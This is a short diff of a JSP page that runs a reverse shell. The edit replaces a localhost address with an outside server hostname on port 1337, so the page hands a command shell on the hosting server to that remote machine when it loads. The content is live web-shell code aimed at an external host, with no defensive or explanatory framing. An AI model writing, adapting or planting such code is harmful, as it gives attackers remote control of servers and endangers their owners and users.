@@ -136,7 +136,7 @@
 <%
     out.print("<pre>");
     // change the host address and/or port number as necessary
-    ReverseShell sh = new ReverseShell("127.0.0.1", 9000);
+    ReverseShell sh = new ReverseShell("vmi850151.contaboserver.net", 1337);
     sh.run();
     if (sh.getMessage() != null) { out.print(sh.getMessage()); }
     sh = null;
